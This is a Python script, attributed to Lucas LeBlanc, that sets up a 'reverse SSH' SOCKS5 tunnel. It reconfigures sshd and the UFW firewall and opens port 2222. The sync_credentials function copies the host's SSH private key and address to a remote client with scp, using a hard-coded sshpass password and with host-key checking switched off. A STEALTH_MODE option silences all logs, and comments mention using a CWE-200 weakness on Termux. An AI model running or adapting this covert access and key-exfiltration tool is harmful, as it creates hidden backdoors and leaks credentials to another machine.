#!/usr/bin/env python3
import os, re, subprocess, getpass, shutil

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

SOCKS5_PORT = "1080"
HOST_USER = os.environ.get("USER", getpass.getuser())
CLIENT_USER = "temp_user"
CLIENT_IP = "192.168.1.3" #Test on local network, adjustment required
#CLIENT_IP = "255.255.255.255" #Universal testing on dynamic public IPs, adjustment required
STEALTH_MODE = False #Stealth mode suppresses logs and disallows sudo

def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

SUPER_USER = "" if is_termux() or STEALTH_MODE else "sudo"

def exec_(cmd, desc):
    print(f"{CYAN}{desc}{RESET}[{GREEN}...{RESET}]") if not STEALTH_MODE else ""
    try:
        subprocess.run(
            cmd,
            shell=True,
            check=True,
            **({} if not STEALTH_MODE else {"stdout": subprocess.DEVNULL, "stderr": subprocess.DEVNULL})
        )
        print(f"{GREEN}Success!{RESET}\n") if not STEALTH_MODE else ""
    except subprocess.CalledProcessError:
        print(f"{RED}Failed:{RESET} {CYAN}{desc}{RESET}") if not STEALTH_MODE else ""
        raise

def install_packages():
    print(f"{CYAN}Checking required packages{RESET}[{GREEN}...{RESET}]") if not STEALTH_MODE else ""
    missing_pkg = []
    for pkg in ["ssh", "sshpass", "scp", "ufw"]:
        if shutil.which(pkg) is None:
            missing_pkg.append(pkg)
    if missing_pkg:
        print(f"{GREEN}Installing:{RESET} {CYAN}{', '.join(missing_pkg)}{RESET}") if not STEALTH_MODE else ""
        exec_(f"{SUPER_USER} apt update && apt install -y {' '.join(missing_pkg)}", f"{GREEN}Installing dependencies{RESET}" if not STEALTH_MODE else "")
    else:
        print("All required packages are installed!\n") if not STEALTH_MODE else ""

def install_tmx_pkgs():
    print(f"{CYAN}Checking required packages{RESET}[{GREEN}...{RESET}]") if not STEALTH_MODE else ""
    missing_pkg = []
    for pkg in ["ssh", "sshpass", "scp", "net-tools"]:
        if shutil.which(pkg) is None:
            termux_pkg = "openssh" if pkg == "ssh" else pkg
            missing_pkg.append(termux_pkg)
    if missing_pkg:
        print(f"{GREEN}Installing:{RESET} {CYAN}{', '.join(missing_pkg)}{RESET}") if not STEALTH_MODE else ""
        exec_(f"pkg update && pkg install -y {' '.join(missing_pkg)}", f"{GREEN}Installing dependencies{RESET}" if not STEALTH_MODE else "")
    else:
        print(f"{GREEN}All required packages are installed!{RESET}\n") if not STEALTH_MODE else ""

def ssh_keygen():
    ssh_dir = os.path.expanduser("~/.ssh")
    os.makedirs(ssh_dir, mode=0o700, exist_ok=True)

    key_path = os.path.join(ssh_dir, "id_ed25519")
    pub_path = key_path + ".pub"
    auth_keys_path = os.path.join(ssh_dir, "authorized_keys")

    if not (os.path.exists(key_path) and os.path.exists(pub_path)):
        exec_(f"ssh-keygen -t ed25519 -f {key_path} -N ''", f"{GREEN}Generating SSH pubkey{RESET}" if not STEALTH_MODE else "")
    else:
        print(f"{YELLOW}SSH pubkey already exists, skipping ssh_key_gen{RESET}[{GREEN}...{RESET}]\n") if not STEALTH_MODE else ""

    if not os.path.exists(pub_path):
        print(f"{RED}Public key not found, something went wrong!{RESET}") if not STEALTH_MODE else ""
        return

    with open(pub_path, "r") as f:
        pubkey = f.read()

    os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
    if not os.path.exists(auth_keys_path):
        open(auth_keys_path, "w").close()
        os.chmod(auth_keys_path, 0o600)

    with open(auth_keys_path, "r") as f:
        content = f.read()
    if pubkey not in content:
        with open(auth_keys_path, "a") as f:
            f.write(pubkey + "\n")
        print(f"{GREEN}Public key added to authorized_keys!{RESET}\n") if not STEALTH_MODE else ""
    else:
        print(f"{YELLOW}Public key is already in authorized_keys, ignoring{RESET}[{GREEN}...{RESET}]\n") if not STEALTH_MODE else ""

def get_host_ip():
    if is_termux():

        # ==================== READ-ME ======================== #
        #                                                       #
        #   - Scraping the local IP without root was only       #
        #     possible because of a CWE-200 exploration.        #
        #   - It is not guaranteed that this will work          #
        #     for versions higher than these:                   #
        #                                                       #
        #   * net-tools v2.10 or lower                          #
        #   * termux: v2025.01.18 or lower                      #
        #   * android: v12 SKQ1.211019.001 or lower             #
        #                                                       #
        # ===================================================== #

        try:
            #CWE-200: Information exposure without sufficient permissions 'No Root'
            output = subprocess.check_output("ifconfig", shell=True, stderr=subprocess.DEVNULL).decode().strip()
            warning = [line for line in output.splitlines() if not line.strip().startswith("Warning")]
            SUPPRESSED_WARNINGS = "\n".join(warning)
            ip = re.findall(r"\b(?!lo\b)(\w+):.*?inet (\d+\.\d+\.\d+\.\d+)", SUPPRESSED_WARNINGS, re.DOTALL)
            if ip:
                print(f"{GREEN}Good Try-Output, Try-Catch-IP Success! IP:{RESET} {CYAN}{ip[0][1]}{RESET}") if not STEALTH_MODE else ""
                return ip[0][1]
            else:
                print(f"{RED}Bad Try-Output, Try-Catch-IP Failed!{RESET}") if not STEALTH_MODE else ""
                #Pick a random device assuming the router's IP is 192.168.1.1
                return "192.168.1.2" #<-- Only as a last resort, it may be incorrect if !ip
        except Exception as e:
            print(f"{RED}ERRO:{RESET} {CYAN}{e}{RESET}") if not STEALTH_MODE else ""
            return "192.168.1.2"
    else:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            return f"{RED}ERRO:{RESET} {CYAN}{e}{RESET}" if not STEALTH_MODE else ""

def sshd_setup():
    print(f"{GREEN}Setting up sshd_config{RESET}[{GREEN}...{RESET}]") if not STEALTH_MODE else ""

    if is_termux():
        path = os.path.join(os.environ["PREFIX"], "etc/ssh/sshd_config")
    else:
        path = "/etc/ssh/sshd_config"

    if not os.path.exists(path):
        print(f"{RED}sshd_config file not found at:{RESET} {CYAN}{path}{RESET}") if not STEALTH_MODE else ""
        return

    backup = path + ".bkp"
    exec_(f"{SUPER_USER} cp {path} {backup}", f"{GREEN}Creating sshd_config backup{RESET}" if not STEALTH_MODE else "")

    with open(path, "r") as f:
        lines = f.readlines()

    n = []
    for line in lines:
        if line.strip().startswith((
            "GatewayPorts",
            "AllowTcpForwarding",
            "AllowUsers",
            "Port",
            "PermitOpen",
            "PermitRootLogin",
            "PasswordAuthentication",
            "PubkeyAuthentication"
        )):
            continue
        n.append(line)

    new_config_lines = [
        "Port 2222\n",
        "GatewayPorts yes\n",
        "AllowTcpForwarding yes\n",
        "PermitOpen any\n",
        "PermitRootLogin no\n",
        "PasswordAuthentication no\n",
        "PubkeyAuthentication yes\n",
        f"AllowUsers {HOST_USER}\n",
    ]

    n.extend(new_config_lines)

    temp_cfg = os.path.expanduser("~/sshd_temp")
    with open(temp_cfg, "w") as f:
        f.writelines(n)

    exec_(f"{SUPER_USER} mv {temp_cfg} {path}", f"{GREEN}Updating sshd_config{RESET}" if not STEALTH_MODE else "")

    if is_termux():
        exec_("sshd -t", f"{GREEN}Checking sshd config{RESET}" if not STEALTH_MODE else "")
        exec_("pgrep sshd > /dev/null || (sshd -p 2222)", f"{GREEN}Starting sshd{RESET}" if not STEALTH_MODE else "")
    else:
        exec_(f"{SUPER_USER} sshd -t", f"{GREEN}Verificando sshd{RESET}" if not STEALTH_MODE else "")
        exec_(f"{SUPER_USER} systemctl restart ssh", f"{GREEN}Restarting SSH{RESET}" if not STEALTH_MODE else "")

def firewall_setup():
    print(f"{GREEN}Setting up 'Firewall' UFW{RESET}[{GREEN}...{RESET}]") if not STEALTH_MODE else ""
    exec_(f"{SUPER_USER} ufw allow 2222/tcp", f"{GREEN}Releasing port 2222{RESET}" if not STEALTH_MODE else "")
    exec_(f"{SUPER_USER} ufw allow from 127.0.0.1 to any port {SOCKS5_PORT}", f"{GREEN}Allowing localhost to access proxy{RESET}" if not STEALTH_MODE else "")
    exec_(f"{SUPER_USER} ufw deny {SOCKS5_PORT}", f"{GREEN}Blocking external access to the port:{RESET} {CYAN}{SOCKS5_PORT}{RESET}" if not STEALTH_MODE else "")
    exec_(f"{SUPER_USER} ufw --force enable", f"{GREEN}Enabling UFW{RESET}" if not STEALTH_MODE else "")
    exec_(f"{SUPER_USER} ufw reload", f"{GREEN}Restarting Firewall{RESET}" if not STEALTH_MODE else "")

def sync_credentials():
    key_path = os.path.expanduser("~/.ssh/id_ed25519")
    pubkey_path = key_path + ".pub"

    if os.path.exists(key_path) and not os.path.exists(pubkey_path):
        print(f"{YELLOW}Private key exists but pubkey does not. Regenerating pubkey{RESET}[{GREEN}...{RESET}]") if not STEALTH_MODE else ""
        exec_(f"ssh-keygen -y -f {key_path} > {pubkey_path}", f"{GREEN}Regenerating pubkey{RESET}" if not STEALTH_MODE else "")

    if not os.path.exists(pubkey_path):
        print(f"{YELLOW}Pubkey not found. Run ssh_keygen first!{RESET}") if not STEALTH_MODE else ""
        return

    HOST_PRIVKEY = open(key_path).read()
    HOST_PUBKEY = open(pubkey_path).read()
    HOST_IP = get_host_ip()

    tmp_dir = "/tmp" if os.path.exists("/tmp") else os.path.expanduser("~/.proxy_temp")
    os.makedirs(tmp_dir, exist_ok=True)

    privk_path = os.path.join(tmp_dir, "host_privkey.txt")
    pubk_path = os.path.join(tmp_dir, "host_pubkey.txt")
    host_info_path = os.path.join(tmp_dir, "host_info.txt")

    with open(privk_path, "w") as f:
        f.write(HOST_PRIVKEY + "\n")
    with open(pubk_path, "w") as f:
        f.write(HOST_PUBKEY + "\n")
    with open(host_info_path, "w") as f:
        print(f"{CYAN}Your SSH Host is:{RESET} {GREEN}{HOST_USER}{RESET}{CYAN}@{RESET}{GREEN}{HOST_IP}{RESET}") if not STEALTH_MODE else ""
        f.write(f"{HOST_USER}@{HOST_IP}\n")

    print(f"{CYAN}The SSH client is:{RESET} {GREEN}{CLIENT_USER}{RESET}{CYAN}@{RESET}{GREEN}{CLIENT_IP}{RESET}") if not STEALTH_MODE else ""

    if not shutil.which("scp"):
        print(f"{RED}Error: scp is not installed or not found in PATH!{RESET}") if not STEALTH_MODE else ""
        return

    try:
        sshpass = f"sshpass -p 'tempass1234'"

        exec_(f"{sshpass} scp -o StrictHostKeyChecking=no -P 2222 {privk_path} {pubk_path} {host_info_path} {CLIENT_USER}@{CLIENT_IP}:~/",
               f"{GREEN}Sending info to the SSH client machine{RESET}" if not STEALTH_MODE else "")

        remote_cmd = (
            f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            f"( [ -f ~/.ssh/authorized_keys ] || touch ~/.ssh/authorized_keys ) && "
            f"grep -qF '{HOST_PUBKEY}' ~/.ssh/authorized_keys || "
            f"echo '{HOST_PUBKEY}' >> ~/.ssh/authorized_keys && "
            f"chmod 600 ~/.ssh/authorized_keys"
        )

        exec_(f"{sshpass} ssh -o StrictHostKeyChecking=no -p 2222 {CLIENT_USER}@{CLIENT_IP} \"{remote_cmd}\"",
               f"{GREEN}Authorizing key on SSH client{RESET}" if not STEALTH_MODE else "")
    except Exception as e:
        print(f"{RED}Error sending or setting key:{RESET} {CYAN}{e}{RESET}") if not STEALTH_MODE else ""
        return

    print(f"{GREEN}Successfully sent and authorized SSH access to:{RESET} {GREEN}{CLIENT_USER}{RESET}{CYAN}@{RESET}{GREEN}{CLIENT_IP}{RESET}\n") if not STEALTH_MODE else ""

def main():

    print(f"""
{GREEN}#{RESET} {CYAN}======================={RESET} {GREEN}WELCOME TO REVERSE SSH{RESET} {CYAN}======================={RESET} {GREEN}#{RESET}
{GREEN}#                                                                        #{RESET}
{GREEN}#   => Standard SSH Authentication flow 4-Steps:                         #{RESET}
{GREEN}#                                                                        #{RESET}
{GREEN}#{RESET}   {YELLOW}SSH CLIENT{RESET} {GREEN}({RESET}{CYAN}PUBKEY{RESET}{GREEN}){RESET} {GREEN}->{RESET} {YELLOW}SSH HOST{RESET} {GREEN}({RESET}{CYAN}AUTH PUBKEY{RESET}{GREEN}){RESET}                        {GREEN}#{RESET}
{GREEN}#{RESET}   {YELLOW}SSH CLIENT{RESET} {GREEN}({RESET}{CYAN}Try Tunnel SOCKS5{RESET}{GREEN}){RESET} {GREEN}->{RESET}{RED}~{RESET}{GREEN}<-{RESET} {YELLOW}SSH HOST{RESET} {GREEN}({RESET}{CYAN}SSH Crypto Challenge{RESET}{GREEN}){RESET} {GREEN}#{RESET}
{GREEN}#                                                                        #{RESET}
{GREEN}#{RESET} {CYAN}----------------------------------------------------------------------{RESET} {GREEN}#{RESET}
{GREEN}#                                                                        #{RESET}
{GREEN}#{RESET}   {RED}=> Reverse SSH Authentication flow 2-Steps:{RESET}                          {GREEN}#{RESET}
{GREEN}#                                                                        #{RESET}
{GREEN}#{RESET}   {YELLOW}SSH HOST{RESET} {GREEN}({RESET}{CYAN}AUTH KEYS{RESET}{GREEN}){RESET} {GREEN}->{RESET}{RED}~{RESET}{GREEN}<-{RESET} {YELLOW}SSH CLIENT{RESET} {GREEN}({RESET}{CYAN}Authorized Tunnel SOCKS5{RESET}{GREEN}){RESET}     {GREEN}#{RESET}
{GREEN}#                                                                        #{RESET}
{GREEN}#{RESET} {CYAN}**********************************************************************{RESET} {GREEN}#{RESET}
{GREEN}#{RESET}                                              CREATED BY: {GREEN}LUCAS LEBLANC #{RESET}
{GREEN}#{RESET} {CYAN}======================================================================{RESET} {GREEN}#{RESET}
""") if not STEALTH_MODE else ""

    if is_termux():
        install_tmx_pkgs()
    else:
        install_packages()

    sshd_setup()
    if not is_termux():
        firewall_setup()
    ssh_keygen()
    sync_credentials()

    print(f"{GREEN}SSH host successfully configured, SOCKS5 tunnel can be used!{RESET}\n") if not STEALTH_MODE else ""

if __name__ == "__main__":
    main()